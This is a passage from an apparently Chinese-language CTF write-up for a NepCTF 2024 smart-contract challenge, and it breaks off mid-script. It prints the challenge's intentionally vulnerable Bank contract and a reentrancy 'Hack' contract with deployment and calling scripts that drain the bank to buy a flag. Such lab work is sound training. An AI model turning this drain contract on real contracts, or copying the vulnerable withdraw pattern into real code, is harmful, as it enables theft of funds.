class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_source, install_solc</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 安装特定版本的solc</span></span><br><span class="line">install_solc(<span class="string">&#x27;0.8.26&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Hardhat节点并将输出重定向到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hardhat_node_output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    node_process = subprocess.Popen(</span><br><span class="line">        [<span class="string">&quot;npx&quot;</span>, <span class="string">&quot;hardhat&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;--hostname&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>],</span><br><span class="line">        stdout=outfile,</span><br><span class="line">        stderr=subprocess.PIPE,</span><br><span class="line">        text=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">30</span>)  <span class="comment"># 等待节点启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取节点输出以获取账户信息</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hardhat_node_output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    output = infile.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析Hardhat节点的输出以获取账户信息</span></span><br><span class="line">accounts = re.findall(<span class="string">r&#x27;0x[a-fA-F0-9]&#123;40&#125;&#x27;</span>, output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(accounts) &lt; <span class="number">2</span>:</span><br><span class="line">    node_process.kill()</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法获取足够的账户信息&quot;</span>)</span><br><span class="line"></span><br><span class="line">deployer_account_address = accounts[<span class="number">0</span>]</span><br><span class="line">attacker_account_address = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用默认私钥初始化Web3实例</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://127.0.0.1:8545&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保连接成功</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> w3.is_connected():</span><br><span class="line">    node_process.kill()</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法连接到以太坊节点&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置部署者和攻击者账户的私钥</span></span><br><span class="line">deployer_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line">attacker_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">deployer_account = &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: deployer_account_address,</span><br><span class="line">    <span class="string">&quot;private_key&quot;</span>: deployer_private_key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attacker_account = &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: attacker_account_address,</span><br><span class="line">    <span class="string">&quot;private_key&quot;</span>: attacker_private_key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solidity合约代码</span></span><br><span class="line">solidity_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="string">pragma solidity ^0.8.0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">contract Bank &#123;</span></span><br><span class="line"><span class="string">    mapping(address =&gt; uint256) public balanceOf;</span></span><br><span class="line"><span class="string">    string private flag;</span></span><br><span class="line"><span class="string">    uint256 public flagPrice = 50 ether;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 事件日志</span></span><br><span class="line"><span class="string">    event Deposit(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event Withdraw(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event TransferFailed(address indexed user, uint256 amount);</span></span><br><span class="line"><span class="string">    event FlagPurchased(address indexed buyer, string flag);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    constructor(string memory _flag) &#123;</span></span><br><span class="line"><span class="string">        flag = _flag;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 存入ether，并更新余额</span></span><br><span class="line"><span class="string">    function deposit() external payable &#123;</span></span><br><span class="line"><span class="string">        balanceOf[msg.sender] += msg.value;</span></span><br><span class="line"><span class="string">        emit Deposit(msg.sender, msg.value);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     // 提取msg.sender的全部ether</span></span><br><span class="line"><span class="string">    function withdraw() external &#123;</span></span><br><span class="line"><span class="string">        uint256 balance = balanceOf[msg.sender]; // 获取余额</span></span><br><span class="line"><span class="string">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span></span><br><span class="line"><span class="string">        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span></span><br><span class="line"><span class="string">        require(success, &quot;Failed to send Ether&quot;);</span></span><br><span class="line"><span class="string">        // 更新余额</span></span><br><span class="line"><span class="string">        balanceOf[msg.sender] = 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获取银行合约的余额</span></span><br><span class="line"><span class="string">    function getBalance() external view returns (uint256) &#123;</span></span><br><span class="line"><span class="string">        return address(this).balance;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获取flag</span></span><br><span class="line"><span class="string">    function getFlag() external view returns (string memory) &#123;</span></span><br><span class="line"><span class="string">        require(balanceOf[msg.sender] &gt;= flagPrice, &quot;Insufficient balance to get flag&quot;);</span></span><br><span class="line"><span class="string">        return flag;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译Solidity合约</span></span><br><span class="line">compiled_sol = compile_source(solidity_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从编译后的内容中获取正确的键值</span></span><br><span class="line">contract_id, contract_interface = compiled_sol.popitem()</span><br><span class="line"><span class="comment"># 创建合约对象</span></span><br><span class="line">Bank = w3.eth.contract(abi=contract_interface[<span class="string">&#x27;abi&#x27;</span>], bytecode=contract_interface[<span class="string">&#x27;bin&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造交易</span></span><br><span class="line">nonce = w3.eth.get_transaction_count(deployer_account[<span class="string">&quot;address&quot;</span>])</span><br><span class="line"></span><br><span class="line">T=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">while</span> T&lt;<span class="number">200</span>:</span><br><span class="line">        flag = os.getenv(<span class="string">&#x27;GZCTF_FLAG&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Environment variable &#x27;GZCTF_FLAG&#x27; is not set. Waiting for 1 minute...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># Wait for 1 minute</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the flag</span></span><br><span class="line">flag = get_flag()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the transaction using the flag from the environment variable</span></span><br><span class="line">transaction = Bank.constructor(flag).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">31337</span>,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 签署交易</span></span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(transaction, private_key=deployer_account[<span class="string">&quot;private_key&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交易回执</span></span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出合约地址和ABI</span></span><br><span class="line">bank_contract_address = tx_receipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约部署成功，地址为: <span class="subst">&#123;bank_contract_address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约ABI: <span class="subst">&#123;contract_interface[<span class="string">&quot;abi&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">subprocess.Popen([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;2.py&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_tcp_server</span>(<span class="params">host, port, message</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.bind((host, port))</span><br><span class="line">        s.listen()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            conn, addr = s.accept()</span><br><span class="line">            <span class="keyword">with</span> conn:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Connected by <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">                conn.sendall(message.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">f&quot;Bank合约部署成功，地址与测试账号私钥为: <span class="subst">&#123;bank_contract_address&#125;</span> <span class="subst">&#123;attacker_account[<span class="string">&#x27;private_key&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">start_tcp_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">65432</span>, message)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hardcat.config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-toolbox&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@type</span> import(&#x27;hardhat/config&#x27;).HardhatUserConfig */</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: <span class="string">&quot;0.8.26&quot;</span>,</span><br><span class="line">  <span class="attr">networks</span>: &#123;</span><br><span class="line">    <span class="attr">hardhat</span>: &#123;</span><br><span class="line">      <span class="attr">accounts</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;20000000000000000000000&quot;</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e&quot;</span>,<span class="comment">//attacker</span></span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;10000000000000000000&quot;</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">privateKey</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">balance</span>: <span class="string">&quot;10000000000000000000000&quot;</span> </span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="attr">localhost</span>: &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&quot;http://127.0.0.1:8545&quot;</span>,</span><br><span class="line">      <span class="comment">// 本地网络通常不需要配置账户</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">defaultNetwork</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>地址获取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到本地节点</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&quot;https://neptune-xxxxx.nepctf.lemonprefect.cn&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来扫描区块链并查找合约创建交易</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_contract_addresses</span>(<span class="params">start_block, end_block</span>):</span><br><span class="line">    contract_addresses = []</span><br><span class="line">    <span class="keyword">for</span> block_number <span class="keyword">in</span> <span class="built_in">range</span>(start_block, end_block + <span class="number">1</span>):</span><br><span class="line">        block = web3.eth.get_block(block_number, full_transactions=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block.transactions:</span><br><span class="line">            <span class="keyword">if</span> tx.to <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">                receipt = web3.eth.get_transaction_receipt(tx.<span class="built_in">hash</span>)</span><br><span class="line">                contract_addresses.append(receipt.contractAddress)</span><br><span class="line">    <span class="keyword">return</span> contract_addresses</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描区块范围</span></span><br><span class="line">start_block = <span class="number">0</span>  <span class="comment"># 起始区块</span></span><br><span class="line">end_block = web3.eth.block_number  <span class="comment"># 当前最新区块</span></span><br><span class="line">contracts = find_contract_addresses(start_block, end_block)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Deployed contract addresses:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> address <span class="keyword">in</span> contracts:</span><br><span class="line">    <span class="built_in">print</span>(address)</span><br></pre></td></tr></table></figure><h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p>阅读代码，大部分是展示了题目的部署，有用的信息是智能合约的代码和给出的攻击者的privatekey。直接在metamask中用privatekey导入账户即可得到攻击者账户的地址0x2eca396F5474202720C4561c06ABcc0Bdd186E2c。</p><p><img src="/images/NepCTF2024-Writeup/image-20240827000351346.png" alt="image-20240827000351346"></p><p>然后用题目所给的脚本扫一下找到题目部署的合约地址</p><p><img src="/images/NepCTF2024-Writeup/image-20240827000642428.png" alt="image-20240827000642428"></p><p>这样就做完了前期的准备工作。</p><p>接下来就是重入攻击，先放个<a href="https://mp.weixin.qq.com/s/4j5_CirSySE1GLd3BP9CZQ">传送门</a>在这。</p><p>阅读题目中给出的合约代码，合约实现了向“银行”存、取、查以及getFlag的操作，银行中本来有50 ether。根据重入攻击，我们要做的是在从“银行”中取钱时触发一个fallback函数，使得能从“银行”中一直取钱，直到”银行“中的钱小于1 ether。据此可以编写如下合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Bank &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function getBalance() external view returns (uint256);</span><br><span class="line">    function getFlag() external view returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Bank public etherStore;</span><br><span class="line">    string public flag;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = Bank(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        etherStore.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag() external &#123;</span><br><span class="line">        etherStore.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">        flag = etherStore.getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署的代码直接抄题目中的即可，输出我们的合约部署的地址和abi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_source, install_solc</span><br><span class="line">install_solc(<span class="string">&#x27;0.8.26&#x27;</span>)</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;https://neptune-43115.nepctf.lemonprefect.cn&quot;</span>))</span><br><span class="line">solidity_code =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="string">pragma solidity ^0.8.0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interface Bank &#123;</span></span><br><span class="line"><span class="string">    function deposit() external payable;</span></span><br><span class="line"><span class="string">    function withdraw() external;</span></span><br><span class="line"><span class="string">    function getBalance() external view returns (uint256);</span></span><br><span class="line"><span class="string">    function getFlag() external view returns (string memory);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">contract Hack &#123;</span></span><br><span class="line"><span class="string">    Bank public etherStore;</span></span><br><span class="line"><span class="string">    string public flag;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    constructor(address _etherStoreAddress) &#123;</span></span><br><span class="line"><span class="string">        etherStore = Bank(_etherStoreAddress);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fallback() external payable &#123;</span></span><br><span class="line"><span class="string">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span></span><br><span class="line"><span class="string">            etherStore.withdraw();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function attack() external payable &#123;</span></span><br><span class="line"><span class="string">        etherStore.deposit&#123;value: msg.value&#125;();</span></span><br><span class="line"><span class="string">        etherStore.withdraw();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function getflag() external &#123;</span></span><br><span class="line"><span class="string">        etherStore.deposit&#123;value: address(this).balance&#125;();</span></span><br><span class="line"><span class="string">        flag = etherStore.getFlag();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">compiled_sol = compile_source(solidity_code)</span><br><span class="line">contract_id, contract_interface = compiled_sol.popitem()</span><br><span class="line">Bank = w3.eth.contract(</span><br><span class="line">    abi=contract_interface[<span class="string">&#x27;abi&#x27;</span>], bytecode=contract_interface[<span class="string">&#x27;bin&#x27;</span>])</span><br><span class="line">nonce = w3.eth.get_transaction_count(<span class="string">&quot;0x2eca396F5474202720C4561c06ABcc0Bdd186E2c&quot;</span>)</span><br><span class="line">transaction = Bank.constructor(<span class="string">&quot;0xA86Cb9aCABb3E6629a47d676BEB38e2455B20917&quot;</span>).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">31337</span>,</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br><span class="line">signed_txn = w3.eth.account.sign_transaction(</span><br><span class="line">    transaction, private_key=<span class="string">&quot;0x4b609fde92771ee750dac4d0aace6c9cf34e341229dbda382e49c492ad206e5e&quot;</span>)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line">bank_contract_address = tx_receipt.contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约部署成功，地址为: <span class="subst">&#123;bank_contract_address&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Bank合约ABI: <span class="subst">&#123;contract_interface[<span class="string">&quot;abi&quot;</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/NepCTF2024-Writeup/image-20240827002114725.png" alt="image-20240827002114725"></p><p>合约部署成功，接下来就是对合约中函数的调用。先将abi复制下来另存为一个名为Hack.abi的文件，注意要将abi中的所有单引号替换成双引号。</p><p>然后编写调用函数的脚本，先调用attack函数攻击获取ether，然后调用getflag函数输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://neptune-11192.nepctf.lemonprefect.cn&#x27;</span>))</span><br><span class="line">contract_address = <span class="string">&quot;0x40f60687B44C526775d40e53103C0cA745b260Fb&quot;</span> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Hack.abi&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    abi = json.load(f)</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line">value = w3.to_wei(<span class="number">5</span>, 